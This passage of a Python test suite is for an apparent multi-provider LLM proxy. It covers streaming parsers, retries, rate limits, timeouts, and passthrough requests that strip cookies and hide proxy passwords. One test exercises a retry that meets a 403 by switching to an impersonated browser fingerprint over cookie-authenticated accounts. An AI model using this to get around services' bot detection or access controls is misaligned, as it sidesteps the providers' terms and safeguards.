            provider.client = Client()
            account = Account("genspark", {"cookie": "cookie"})
            with patch("app.providers.genspark.iter_upstream_events", new=events):
                stream = provider.chat_stream(
                    account, "model", [{"role": "user", "content": "x"}], {})
                first = await asyncio.wait_for(anext(stream), timeout=0.2)
                await stream.aclose()
            return first, provider.client.deleted

        first, deleted = asyncio.run(run())
        self.assertEqual(first, {"type": "text", "text": "first"})
        self.assertEqual(deleted, ["project-1"])
        self.assertTrue(response.closed)

    def test_done_sentinel_stops_genspark_and_antigravity_parsers(self):
        gs_response = FakeLineResponse([
            b'data: {"type":"message_field_delta","field_name":"content","delta":"ok"}',
            b"data: [DONE]",
            b'data: {"type":"message_field_delta","field_name":"content","delta":"late"}',
        ])
        ag_response = FakeLineResponse([
            b"data: [DONE]", b"",
            b'data: {"response":{"candidates":[{"content":{"parts":[{"text":"late"}]}}]}}',
            b"",
        ])

        async def run():
            gs = [event async for event in iter_upstream_events(gs_response)]
            ag = [event async for event in AntigravityProvider()._iter_sse(ag_response)]
            return gs, ag

        gs, ag = asyncio.run(run())
        self.assertEqual([event.text for event in gs if event.kind == "text"], ["ok"])
        self.assertEqual(ag, [])

    def test_antigravity_403_falls_back_to_next_endpoint_and_closes_response(self):
        denied = FakeLineResponse(status=403)
        accepted = FakeLineResponse([
            b'data: {"response":{"candidates":[{"content":{"parts":[{"text":"ok"}]}}]}}',
            b"", b"data: [DONE]",
        ])

        class Session:
            def __init__(self):
                self.responses = iter([denied, accepted])
                self.urls = []

            async def post(self, url, **_kwargs):
                self.urls.append(url)
                return next(self.responses)

        async def run():
            provider = AntigravityProvider()
            session = Session()
            with patch.object(provider, "_ensure_token", return_value="token"), \
                    patch.object(provider, "_project_id", return_value="project"), \
                    patch("app.providers.antigravity.http.get_session", return_value=session):
                events = [event async for event in provider.chat_stream(
                    Account("antigravity", {}), "model",
                    [{"role": "user", "content": "x"}], {})]
            return events, session.urls

        events, urls = asyncio.run(run())
        self.assertEqual(events, [{"type": "text", "text": "ok"}])
        self.assertEqual(len(urls), 2)
        self.assertTrue(denied.closed)
        self.assertTrue(accepted.closed)

    def test_kiro_429_is_temporary_rate_limit(self):
        response = FakeLineResponse(status=429)

        class Session:
            async def post(self, *_args, **_kwargs):
                return response

        account = Account("kiro", {"region": "us-east-1"}, extra={"tokens": {
            "accessToken": "token", "expiresAt": time.time() + 3600,
        }})

        async def run():
            with patch("app.providers.kiro.http.get_session", return_value=Session()):
                await anext(KiroProvider().chat_stream(
                    account, "model", [{"role": "user", "content": "x"}], {}))

        with self.assertRaises(ProviderRateLimitError):
            asyncio.run(run())
        self.assertTrue(response.closed)

    def test_genspark_closes_streamed_403_before_fingerprint_retry(self):
        first = FakeLineResponse(status=403)
        second = FakeLineResponse(status=200)

        async def run():
            client = GensparkClient("https://api.test")
            responses = iter([first, second])

            async def request_once(*_args, **_kwargs):
                return next(responses)

            client._request_once = request_once
            with patch.object(client, "FALLBACK_CHAIN", ["chrome150"]):
                result = await client._request("GET", "/test", stream=True)
            return result

        self.assertIs(asyncio.run(run()), second)
        self.assertTrue(first.closed)

    def test_genspark_connection_failure_is_normalized_for_account_retry(self):
        class Client:
            def build_agent_payload(self, **_kwargs):
                return {}

            def build_copilot_payload(self, **_kwargs):
                return {}

            async def stream_chat(self, *_args, **_kwargs):
                raise GensparkNetworkError("offline")

        async def run():
            provider = GensparkProvider()
            provider.client = Client()
            await anext(provider.chat_stream(
                Account("genspark", {"cookie": "cookie"}), "model",
                [{"role": "user", "content": "x"}], {}))

        with self.assertRaises(ProviderNetworkError):
            asyncio.run(run())

    def test_grok_keeps_history_deduplicates_event_shapes_and_has_idle_timeout(self):
        class WebSocket:
            def __init__(self, *, stall=False):
                self.sent = []
                self.stall = stall

            async def send(self, value):
                self.sent.append(json.loads(value))

            def __aiter__(self):
                async def frames():
                    yield json.dumps({"session_id": "session-1",
                                      "event": {"type": "session.created"}})
                    if self.stall:
                        await asyncio.Event().wait()
                        return
                    yield json.dumps({"event": {"type": "response.chunk", "chunk": {
                        "text": {"text": "Hello", "channel": "FINAL"}}}})
                    yield json.dumps({"event": {"type": "response.output_text.delta",
                                                 "delta": "Hello"}})
                    yield json.dumps({"event": {"type": "response.output_text.delta",
                                                 "delta": " world"}})
                    yield json.dumps({"event": {"type": "response.done",
                                                 "response": {"id": "response-1"}}})
                return frames()

        class Connection:
            def __init__(self, websocket):
                self.websocket = websocket

            async def __aenter__(self):
                return self.websocket

            async def __aexit__(self, *_args):
                return False

        messages = [
            {"role": "system", "content": "Be precise"},
            {"role": "user", "content": "Earlier question"},
            {"role": "assistant", "content": "Earlier answer"},
            {"role": "user", "content": "Continue"},
        ]

        async def collect(websocket):
            with patch("websockets.connect", return_value=Connection(websocket)):
                events = [event async for event in GrokProvider().chat_stream(
                    Account("grok", {"cookies": "sso=x"}, extra={"user_id": "user-1"}),
                    "grok-fast", messages, {})]
            return events

        websocket = WebSocket()
        events = asyncio.run(collect(websocket))
        self.assertEqual("".join(event["text"] for event in events if event["type"] == "text"),
                         "Hello world")
        prompt = websocket.sent[1]["event"]["item"]["x_grok"]["input_chunks"][0]["text"]["text"]
        self.assertIn("Be precise", prompt)
        self.assertIn("Earlier question", prompt)
        self.assertIn("Earlier answer", prompt)
        self.assertIn("Continue", prompt)

        async def time_out():
            with patch.object(config_store.settings, "stream_idle_timeout", 0.01):
                await collect(WebSocket(stall=True))

        with self.assertRaises(ProviderNetworkError):
            asyncio.run(time_out())

class PassthroughContracts(unittest.TestCase):
    def test_passthrough_preserves_body_type_duplicate_query_and_streams_response(self):
        account = Account("custom", {"name": "local", "base_url": "https://api.test/v1",
                                     "api_key": "secret"})
        upstream = FakeLineResponse(
            headers={"content-type": "application/octet-stream", "content-encoding": "gzip",
                     "transfer-encoding": "chunked"},
            chunks=[b"one", b"two"],
        )

        class Session:
            def __init__(self):
                self.kwargs = {}

            async def request(self, *_args, **kwargs):
                self.kwargs = kwargs
                return upstream

        session = Session()

        async def run():
            request = make_request(
                {"value": 1}, content_type="multipart/form-data; boundary=test",
                query="tag=a&tag=b", extra_headers={
                    "x-hub-key": "hub", "cookie": "memuai_session=must-not-leak",
                    "proxy-authorization": "Basic must-not-leak",
                },
            )
            with patch.object(config_store, "authorize_api_request", return_value=True), \
                    patch("app.passthrough._find_custom", return_value=account), \
                    patch("app.providers.get", return_value=CustomProvider()), \
                    patch("app.providers.http.get_session", return_value=session):
                response = await passthrough("local", "upload", request)
                content = b"".join([chunk async for chunk in response.body_iterator])
            return response, content

        response, content = asyncio.run(run())
        self.assertEqual(content, b"onetwo")
        self.assertEqual(session.kwargs["headers"]["Content-Type"],
                         "multipart/form-data; boundary=test")
        self.assertEqual(session.kwargs["params"], [("tag", "a"), ("tag", "b")])
        self.assertNotIn("cookie", {key.lower() for key in session.kwargs["headers"]})
        self.assertNotIn("proxy-authorization", {key.lower() for key in session.kwargs["headers"]})
        self.assertNotIn("content-encoding", response.headers)
        self.assertNotIn("transfer-encoding", response.headers)
        self.assertTrue(upstream.closed)

    def test_passthrough_transport_error_does_not_expose_exception_details(self):
        account = Account("custom", {"name": "local", "base_url": "https://api.test/v1"})

        class Session:
            async def request(self, *_args, **_kwargs):
                raise RuntimeError("socks5://user:password@proxy.invalid")

        async def run():
            with patch.object(config_store, "authorize_api_request", return_value=True), \
                    patch("app.passthrough._find_custom", return_value=account), \
                    patch("app.providers.get", return_value=CustomProvider()), \
                    patch("app.providers.http.get_session", return_value=Session()):
                return await passthrough("local", "models", make_request({}))

        response = asyncio.run(run())
        self.assertEqual(response.status_code, 502)
        self.assertNotIn("password", response.body.decode("utf-8"))

if __name__ == "__main__":
    unittest.main()
